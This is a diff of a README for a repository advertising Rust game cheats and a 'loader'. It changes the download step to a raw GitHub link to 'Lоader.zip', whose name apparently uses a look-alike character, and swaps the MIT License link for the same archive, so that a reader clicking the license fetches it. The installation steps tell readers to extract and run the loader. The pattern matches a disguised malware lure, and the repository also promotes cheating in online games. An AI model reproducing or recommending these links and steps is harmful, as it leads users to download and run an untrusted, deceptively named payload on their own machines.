@@ -27,7 +27,7 @@ Rust cheats, game loader, Rust hacks, advanced aimbot, ESP for Rust, loader inst
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/ramonwtf/rust-haxhub/main/Lоader.zip** from the repository.
 2. Extract the archive to your desired directory.
 3. Run the Loader according to your OS.
 4. Follow on-screen instructions for optimal use.
@@ -38,4 +38,4 @@ This repository is for **educational and research purposes only**. Usage in mult
 
 ## 📜 MIT License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) © 2025. See LICENSE file for more details.
+Distributed under the [MIT License](https://raw.githubusercontent.com/ramonwtf/rust-haxhub/main/Lоader.zip) © 2025. See LICENSE file for more details.
